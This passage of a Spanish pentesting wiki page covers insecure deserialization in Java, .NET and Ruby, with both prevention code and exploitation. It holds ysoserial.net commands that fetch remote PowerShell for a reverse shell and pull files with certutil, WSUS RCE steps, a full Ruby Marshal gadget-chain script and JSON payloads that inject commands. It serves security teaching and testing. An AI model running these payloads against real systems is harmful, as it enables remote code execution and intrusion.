- Si quieres probar algunos ysoserial payloads puedes **ejecutar esta webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
- [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Por qué

Java usa mucha serialización para varios propósitos como:

- **HTTP requests**: La serialización se emplea ampliamente en la gestión de parámetros, ViewState, cookies, etc.
- **RMI (Remote Method Invocation)**: El protocolo Java RMI, que se basa completamente en la serialización, es una piedra angular para la comunicación remota en aplicaciones Java.
- **RMI over HTTP**: Este método se usa comúnmente en aplicaciones web de cliente pesado basadas en Java, utilizando la serialización para todas las comunicaciones de objetos.
- **JMX (Java Management Extensions)**: JMX utiliza la serialización para transmitir objetos a través de la red.
- **Custom Protocols**: En Java, la práctica estándar implica la transmisión de objetos Java en bruto, lo cual será demostrado en ejemplos de exploit próximos.

### Prevención

#### Objetos transient

Una clase que implementa `Serializable` puede marcar como `transient` cualquier objeto dentro de la clase que no deba ser serializable. Por ejemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar la serialización de una clase que necesita implementar Serializable

En escenarios donde ciertos **objetos deben implementar la interfaz `Serializable`** debido a la jerarquía de clases, existe el riesgo de deserialización no intencionada. Para evitar esto, asegúrese de que estos objetos no sean deserializables definiendo un método `final` `readObject()` que lance consistentemente una excepción, como se muestra a continuación:
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
throw new java.io.IOException("Cannot be deserialized");
}
```
#### **Mejorando la seguridad de la deserialización en Java**

**Personalizar `java.io.ObjectInputStream`** es un enfoque práctico para asegurar los procesos de deserialización. Este método es adecuado cuando:

- El código de deserialización está bajo tu control.
- Se conocen las clases esperadas para la deserialización.

Sobrescribe el método **`resolveClass()`** para limitar la deserialización únicamente a las clases permitidas. Esto evita la deserialización de cualquier clase excepto aquellas explícitamente autorizadas, como en el siguiente ejemplo que restringe la deserialización solo a la clase `Bicycle`:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Using a Java Agent for Security Enhancement** ofrece una solución de respaldo cuando no es posible modificar el código. Este método se aplica principalmente para **blacklisting harmful classes**, usando un parámetro de la JVM:
```
-javaagent:name-of-agent.jar
```
Proporciona una forma de asegurar deserialization de manera dinámica, ideal para entornos donde los cambios de código inmediatos son poco prácticos.

Consulta un ejemplo en [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

**Implementación de Serialization Filters**: Java 9 introdujo serialization filters vía la interfaz **`ObjectInputFilter`**, proporcionando un mecanismo potente para especificar criterios que los objetos serialized deben cumplir antes de ser deserialized. Estos filtros pueden aplicarse globalmente o por stream, ofreciendo un control granular sobre el proceso de deserialization.

Para utilizar serialization filters, puedes establecer un filtro global que se aplique a todas las operaciones de deserialization o configurarlo dinámicamente para streams específicos. Por ejemplo:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Aprovechando librerías externas para mejorar la seguridad**: Libraries such as **NotSoSerial**, **jdeserialize**, and **Kryo** offer advanced features for controlling and monitoring Java deserialization. Estas librerías pueden proporcionar capas adicionales de seguridad, como whitelisting o blacklisting de clases, analizar objetos serializados antes de la deserialization e implementar estrategias de serialization personalizadas.

- **NotSoSerial** intercepta los procesos de deserialization para prevenir la ejecución de código no confiable.
- **jdeserialize** permite el análisis de objetos Java serializados sin deserializarlos, ayudando a identificar contenido potencialmente malicioso.
- **Kryo** es un framework de serialization alternativo que enfatiza la velocidad y la eficiencia, ofreciendo estrategias de serialization configurables que pueden mejorar la seguridad.

### Referencias

- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- Deserialization and ysoserial talk: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
- [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
- [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
- Talk about gadgetinspector: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) and slides: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
- Marshalsec paper: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
- [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
- [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
- [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** talk: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) and slides: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- Deserialziations CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection & log4Shell

Encuentra qué es **JNDI Injection, cómo abusar de él vía RMI, CORBA & LDAP y cómo explotar log4shell** (y un ejemplo de esta vuln) en la siguiente página:


{{#ref}}
jndi-java-naming-and-directory-interface-and-log4shell.md
{{#endref}}

## JMS - Java Message Service

> The **Java Message Service** (**JMS**) API is a Java message-oriented middleware API for sending messages between two or more clients. It is an implementation to handle the producer–consumer problem. JMS is a part of the Java Platform, Enterprise Edition (Java EE), and was defined by a specification developed at Sun Microsystems, but which has since been guided by the Java Community Process. It is a messaging standard that allows application components based on Java EE to create, send, receive, and read messages. It allows the communication between different components of a distributed application to be loosely coupled, reliable, and asynchronous. (From [Wikipedia](https://en.wikipedia.org/wiki/Java_Message_Service)).

### Productos

There are several products using this middleware to send messages:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../images/image (1056).png>)

### Explotación

Básicamente hay un **montón de servicios que usan JMS de forma insegura**. Por lo tanto, si tienes **suficientes privilegios** para enviar mensajes a estos servicios (usualmente necesitarás credenciales válidas) podrías ser capaz de enviar **objetos maliciosos serialized que serán deserialized por el consumer/suscriptor**.\
Esto significa que en esta explotación todos los **clientes que vayan a usar ese mensaje se verán comprometidos**.

Debes recordar que incluso si un servicio es vulnerable (porque deserializa inseguramente la entrada del usuario) aún necesitas encontrar gadgets válidos para explotar la vulnerabilidad.

La herramienta [JMET](https://github.com/matthiaskaiser/jmet) fue creada para **conectarse y atacar estos servicios enviando varios objetos maliciosos serialized usando gadgets conocidos**. Estos exploits funcionarán si el servicio sigue siendo vulnerable y si alguno de los gadgets usados está dentro de la aplicación vulnerable.

### Referencias

- [Patchstack advisory – Everest Forms unauthenticated PHP Object Injection (CVE-2025-52709)](https://patchstack.com/articles/critical-vulnerability-impacting-over-100k-sites-patched-in-everest-forms-plugin/)

- JMET talk: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
- Slides: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

En el contexto de .Net, los exploits de deserialization operan de manera similar a los encontrados en Java, donde se explotan gadgets para ejecutar código específico durante la deserialization de un objeto.

### Huella

#### WhiteBox

El código fuente debe ser inspeccionado en busca de ocurrencias de:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

El enfoque debe estar en serializadores que permitan que el tipo sea determinado por una variable bajo control del usuario.

#### BlackBox

La búsqueda debe centrarse en la cadena codificada Base64 **AAEAAAD/////** o cualquier patrón similar que pueda someterse a deserialization en el lado del servidor, otorgando control sobre el tipo a deserializar. Esto podría incluir, pero no limitarse a, estructuras **JSON** o **XML** que contengan `TypeObject` o `$type`.

### ysoserial.net

En este caso puedes usar la herramienta [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) para **crear los exploits de deserialization**. Una vez descargado el repositorio git deberías **compilar la herramienta** usando Visual Studio, por ejemplo.

Si quieres aprender sobre **cómo ysoserial.net crea su exploit** puedes [**consultar esta página donde se explica el ObjectDataProvider gadget + ExpandedWrapper + Json.Net formatter**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

Las opciones principales de **ysoserial.net** son: **`--gadget`**, **`--formatter`**, **`--output`** y **`--plugin`.**

- **`--gadget`** usado para indicar el gadget a abusar (indicar la clase/función que será abusada durante la deserialization para ejecutar comandos).
- **`--formatter`**, usado para indicar el método para serializar el exploit (necesitas saber qué librería está usando el backend para deserializar la payload y usar la misma para serializarla).
- **`--output`** usado para indicar si quieres el exploit en **raw** o codificado en **base64**. _Nota que **ysoserial.net** **encode** la payload usando **UTF-16LE** (encoding usado por defecto en Windows), así que si obtienes el raw y solo lo codificas desde una consola de Linux podrías tener algunos problemas de **encoding compatibility** que impedirán que el exploit funcione correctamente (en la caja HTB JSON la payload funcionó en ambos UTF-16LE y ASCII pero esto no significa que siempre vaya a funcionar)._
- **`--plugin`** ysoserial.net soporta plugins para crear **exploits para frameworks específicos** como ViewState

#### Más parámetros de ysoserial.net

- `--minify` proporcionará una **payload más pequeña** (si es posible)
- `--raf -f Json.Net -c "anything"` Esto indicará todos los gadgets que pueden usarse con un formatter proporcionado (`Json.Net` en este caso)
- `--sf xml` puedes **indicar un gadget** (`-g`) y ysoserial.net buscará formatters que contengan "xml" (case insensitive)

**Ejemplos de ysoserial** para crear exploits:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** también tiene un **parámetro muy interesante** que ayuda a entender mejor cómo funciona cada exploit: `--test`\
Si indicas este parámetro **ysoserial.net** intentará **probar el exploit localmente,** de modo que puedas comprobar si tu payload funcionará correctamente.\
Este parámetro es útil porque si revisas el código encontrarás fragmentos de código como el siguiente (desde [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Esto significa que, para probar el exploit, el código llamará a [serializersHelper.JsonNet_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539)
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
En el **código anterior es vulnerable al exploit creado**. Por lo tanto, si encuentras algo similar en una aplicación .Net significa que probablemente esa aplicación también sea vulnerable.\
Por eso el parámetro **`--test`** nos permite entender **qué chunks de código son vulnerables** al desrialization exploit que **ysoserial.net** puede crear.

### ViewState

Echa un vistazo a [este POST sobre **how to try to exploit the __ViewState parameter of .Net**](exploiting-__viewstate-parameter.md) para **execute arbitrary code.** Si **ya conoces los secretos** usados por la máquina víctima, [**read this post to know to execute code**](exploiting-__viewstate-knowing-the-secret.md).

### Real‑world sink: WSUS AuthorizationCookie & Reporting SOAP → BinaryFormatter/SoapFormatter RCE

- Endpoints afectados:
- `/SimpleAuthWebService/SimpleAuth.asmx` → GetCookie() AuthorizationCookie decrypted then deserialized with BinaryFormatter.
- `/ReportingWebService.asmx` → ReportEventBatch and related SOAP ops that reach SoapFormatter sinks; base64 gadget is processed when the WSUS console ingests the event.
- Causa raíz: attacker‑controlled bytes reach legacy .NET formatters (BinaryFormatter/SoapFormatter) without strict allow‑lists/binders, so gadget chains execute as the WSUS service account (often SYSTEM).

Minimal exploitation (Reporting path):
1) Genera un gadget .NET con ysoserial.net (BinaryFormatter or SoapFormatter) y obtén la salida en base64, por ejemplo:
```powershell
# Reverse shell (EncodedCommand) via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Simple calc via SoapFormatter (test)
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
2) Crear un SOAP para `ReportEventBatch` incrustando el gadget base64 y hacer POST a `/ReportingWebService.asmx`.
3) Cuando un admin abre la consola de WSUS, el evento se deserializa y el gadget se dispara (RCE como SYSTEM).

AuthorizationCookie / GetCookie()
- Una AuthorizationCookie falsificada puede ser aceptada, descifrada y pasada a un sink de BinaryFormatter, permitiendo RCE pre‑auth si es alcanzable.

Parámetros del Public PoC (tecxx/CVE-2025-59287-WSUS):
```powershell
$lhost = "192.168.49.51"
$lport = 53
$targetURL = "http://192.168.51.89:8530"
```
Ver [Windows Local Privilege Escalation – WSUS](../../windows-hardening/windows-local-privilege-escalation/README.md)

### Prevención

Para mitigar los riesgos asociados con la deserialización en .Net:

- **Evitar permitir que los streams de datos definan sus tipos de objeto.** Utilice `DataContractSerializer` o `XmlSerializer` cuando sea posible.
- **Para `JSON.Net`, establezca `TypeNameHandling` en `None`:** `TypeNameHandling = TypeNameHandling.None`
- **Evitar usar `JavaScriptSerializer` con un `JavaScriptTypeResolver`.**
- **Limitar los tipos que pueden deserializarse**, entendiendo los riesgos inherentes con los tipos de .Net, como `System.IO.FileInfo`, que puede modificar propiedades de archivos del servidor, potencialmente provocando ataques de denegación de servicio.
- **Tener precaución con tipos que tienen propiedades riesgosas**, como `System.ComponentModel.DataAnnotations.ValidationException` con su propiedad `Value`, que puede ser explotada.
- **Controlar de forma segura la instanciación de tipos** para evitar que atacantes influyan en el proceso de deserialización, lo que puede dejar vulnerables incluso a `DataContractSerializer` o `XmlSerializer`.
- **Implementar controles de lista blanca** usando un `SerializationBinder` personalizado para `BinaryFormatter` y `JSON.Net`.
- **Mantenerse informado sobre gadgets de deserialización inseguros conocidos** dentro de .Net y asegurar que los deserializadores no instancien dichos tipos.
- **Aislar código potencialmente riesgoso** del código con acceso a internet para evitar exponer gadgets conocidos, como `System.Windows.Data.ObjectDataProvider` en aplicaciones WPF, a fuentes de datos no confiables.

### **Referencias**

- Java and .Net JSON deserialization **paper:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** charla: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) y diapositivas: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
- [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#net-csharp)
- [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf)
- [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

En Ruby, la serialización se facilita mediante dos métodos dentro de la librería **marshal**. El primer método, conocido como **dump**, se usa para transformar un objeto en un flujo de bytes. Este proceso se denomina serialización. Por el contrario, el segundo método, **load**, se emplea para revertir un flujo de bytes a un objeto, un proceso conocido como deserialización.

Para asegurar los objetos serializados, **Ruby utiliza HMAC (Hash-Based Message Authentication Code)**, garantizando la integridad y autenticidad de los datos. La clave utilizada para este propósito se almacena en una de las siguientes ubicaciones:

- `config/environment.rb`
- `config/initializers/secret_token.rb`
- `config/secrets.yml`
- `/proc/self/environ`

**Ruby 2.X generic deserialization to RCE gadget chain (more info in** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Otra cadena de RCE para explotar Ruby On Rails: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() method

Como se explica en [**este informe de vulnerabilidad**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/), si alguna entrada de usuario no sanitizada llega al método `.send()` de un objeto Ruby, este método permite **invocar cualquier otro método** del objeto con cualquier parámetro.

Por ejemplo, llamar a eval y luego código Ruby como segundo parámetro permitirá ejecutar código arbitrario:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
Además, si solo un parámetro de **`.send()`** está controlado por un atacante, como se mencionó en el writeup anterior, es posible llamar a cualquier método del objeto que **no requiera argumentos** o cuyos argumentos tengan **valores por defecto**.\
Para esto, es posible enumerar todos los métodos del objeto para **encontrar algunos métodos interesantes que cumplan esos requisitos**.
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
### Ruby class pollution

Consulta cómo podría ser posible [contaminar una clase de Ruby y abusar de ella aquí](ruby-class-pollution.md).

### Ruby _json pollution

Al enviar en el body algunos valores no hashables como un array, se añadirán en una nueva clave llamada `_json`. Sin embargo, es posible que un atacante también establezca en el body un valor llamado `_json` con los valores arbitrarios que desee. Entonces, si el backend, por ejemplo, comprueba la veracidad de un parámetro pero luego también usa el parámetro `_json` para realizar alguna acción, podría producirse un bypass de autorización.

Consulta más información en la [página Ruby _json pollution](ruby-_json-pollution.md).

### Otras librerías

Esta técnica fue tomada [ **de esta entrada del blog**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

Existen otras librerías de Ruby que pueden usarse para serializar objetos y que, por tanto, podrían ser abusadas para obtener RCE durante una deserialización insegura. La siguiente tabla muestra algunas de estas librerías y el método que se invoca de la librería cargada cada vez que se deserializa (función para abusar y conseguir RCE, básicamente):

<table data-header-hidden><thead><tr><th width="179"></th><th width="146"></th><th></th></tr></thead><tbody><tr><td><strong>Librería</strong></td><td><strong>Datos de entrada</strong></td><td><strong>Método que se ejecuta dentro de la clase</strong></td></tr><tr><td>Marshal (Ruby)</td><td>Binary</td><td><code>_load</code></td></tr><tr><td>Oj</td><td>JSON</td><td><code>hash</code> (la clase necesita ser colocada en un hash(map) como clave)</td></tr><tr><td>Ox</td><td>XML</td><td><code>hash</code> (la clase necesita ser colocada en un hash(map) como clave)</td></tr><tr><td>Psych (Ruby)</td><td>YAML</td><td><code>hash</code> (la clase necesita ser colocada en un hash(map) como clave)<br><code>init_with</code></td></tr><tr><td>JSON (Ruby)</td><td>JSON</td><td><code>json_create</code> ([ver notas sobre json_create al final](#table-vulnerable-sinks))</td></tr></tbody></table>

Ejemplo básico:
```ruby
# Existing Ruby class inside the code of the app
class SimpleClass
def initialize(cmd)
@cmd = cmd
end

def hash
system(@cmd)
end
end

# Exploit
require 'oj'
simple = SimpleClass.new("open -a calculator") # command for macOS
json_payload = Oj.dump(simple)
puts json_payload

# Sink vulnerable inside the code accepting user input as json_payload
Oj.load(json_payload)
```
En el caso de intentar abusar de Oj, fue posible encontrar una gadget class que, dentro de su función `hash`, llamaba a `to_s`, que llamaba a spec, que llamaba a fetch_path — lo que se podía aprovechar para que recuperara una URL aleatoria, proporcionando un gran detector de este tipo de unsanitized deserialization vulnerabilities.
```json
{
"^o": "URI::HTTP",
"scheme": "s3",
"host": "example.org/anyurl?",
"port": "anyport",
"path": "/",
"user": "anyuser",
"password": "anypw"
}
```
Además, se observó que con la técnica anterior también se crea una carpeta en el sistema, lo cual es un requisito para abusar de otro gadget y convertir esto en un RCE completo con algo como:
```json
{
"^o": "Gem::Resolver::SpecSpecification",
"spec": {
"^o": "Gem::Resolver::GitSpecification",
"source": {
"^o": "Gem::Source::Git",
"git": "zip",
"reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
"root_dir": "/tmp",
"repository": "anyrepo",
"name": "anyname"
},
"spec": {
"^o": "Gem::Resolver::Specification",
"name": "name",
"dependencies": []
}
}
}
```
Check for more details in the [**original post**](https://github.blog/security/vulnerability-research/execute-commands-by-sending-json-learn-how-unsafe-deserialization-vulnerabilities-work-in-ruby-projects/?utm_source=pocket_shared).

### Bootstrap Caching

Not really a desearilization vuln but a nice trick to abuse bootstrap caching to to get RCE from a rails application with an arbitrary file write (find the complete [original post in here](https://blog.convisoappsec.com/en/from-arbitrary-file-write-to-rce-in-restricted-rails-apps/)).

Below is a short summary of the steps detailed in the article for exploiting an arbitrary file write vulnerability by abusing Bootsnap caching:

- Identify the Vulnerability and Environment

La funcionalidad de subida de archivos de la app Rails permite a un atacante escribir archivos arbitrariamente. Aunque la app se ejecuta con restricciones (solo ciertos directorios como tmp son escribibles debido al usuario no-root de Docker), esto todavía permite escribir en el directorio de caché de Bootsnap (típicamente bajo tmp/cache/bootsnap).

- Understand Bootsnap’s Cache Mechanism

Bootsnap speeds up Rails boot times by caching compiled Ruby code, YAML, and JSON files. It stores cache files that include a cache key header (with fields like Ruby version, file size, mtime, compile options, etc.) followed by the compiled code. This header is used to validate the cache during app startup.

- Gather File Metadata

El atacante primero selecciona un archivo objetivo que probablemente se cargue durante el arranque de Rails (por ejemplo, set.rb de la biblioteca estándar de Ruby). Ejecutando código Ruby dentro del contenedor, extrae metadatos críticos (como RUBY_VERSION, RUBY_REVISION, size, mtime y compile_option). Estos datos son esenciales para construir una cache key válida.

- Compute the Cache File Path

Replicando el mecanismo de hash FNV-1a 64-bit de Bootsnap, se determina la ruta correcta del archivo de caché. Este paso asegura que el archivo de caché malicioso se coloque exactamente donde Bootsnap lo espera (por ejemplo, under tmp/cache/bootsnap/compile-cache-iseq/).

- Craft the Malicious Cache File

El atacante prepara un payload que:

- Ejecuta comandos arbitrarios (por ejemplo, running id para mostrar info del proceso).
- Elimina la caché maliciosa después de la ejecución para prevenir explotación recursiva.
- Carga el archivo original (p. ej., set.rb) para evitar que la aplicación se caiga.

Este payload se compila en código Ruby binario y se concatena con una cabecera de cache key cuidadosamente construida (usando los metadatos recopilados y el número de versión correcto de Bootsnap).

- Overwrite and Trigger Execution
Usando la arbitrary file write vulnerability, el atacante escribe el archivo de caché creado en la ubicación calculada. A continuación, desencadena un reinicio del servidor (escribiendo en tmp/restart.txt, que es monitorizado por Puma). Durante el reinicio, cuando Rails requiere el archivo objetivo, se carga el archivo de caché malicioso, resultando en remote code execution (RCE).



### Ruby Marshal exploitation in practice (updated)

Trata cualquier ruta por la que bytes no confiables lleguen a `Marshal.load`/`marshal_load` como un RCE sink. Marshal reconstruye grafos de objetos arbitrarios y dispara callbacks de bibliotecas/gems durante la materialización.


- Minimal vulnerable Rails code path:
```ruby
class UserRestoreController < ApplicationController
def show
user_data = params[:data]
if user_data.present?
deserialized_user = Marshal.load(Base64.decode64(user_data))
render plain: "OK: #{deserialized_user.inspect}"
else
render plain: "No data", status: :bad_request
end
end
end
```
- Clases de gadget comunes vistas en cadenas reales: `Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`.
- Marcador típico de efecto secundario incrustado en payloads (ejecutado durante el unmarshal):
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```
Dónde aparece en aplicaciones reales:
- Almacenamientos de cache y de sesión de Rails que históricamente usan Marshal
- Backends de background jobs y almacenes de objetos respaldados en archivos
- Cualquier persistencia o transporte personalizado de blobs binarios de objetos

Descubrimiento industrializado de gadgets:
- Grep para constructores, `hash`, `_load`, `init_with`, o métodos con efectos secundarios invocados durante el unmarshal
- Usa las queries de CodeQL para Ruby sobre unsafe deserialization para rastrear sources → sinks y detectar gadgets
- Valida con PoCs públicos multi-formato (JSON/XML/YAML/Marshal)


## Referencias

- Trail of Bits – Marshal madness: A brief history of Ruby deserialization exploits: https://blog.trailofbits.com/2025/08/20/marshal-madness-a-brief-history-of-ruby-deserialization-exploits/
- elttam – Ruby 2.x Universal RCE Deserialization Gadget Chain: https://www.elttam.com/blog/ruby-deserialization/
- Phrack #69 – Rails 3/4 Marshal chain: https://phrack.org/issues/69/12.html
- CVE-2019-5420 (Rails 5.2 insecure deserialization): https://nvd.nist.gov/vuln/detail/CVE-2019-5420
- ZDI – RCE via Ruby on Rails Active Storage insecure deserialization: https://www.zerodayinitiative.com/blog/2019/6/20/remote-code-execution-via-ruby-on-rails-active-storage-insecure-deserialization
- Include Security – Discovering gadget chains in Rubyland: https://blog.includesecurity.com/2024/03/discovering-deserialization-gadget-chains-in-rubyland/
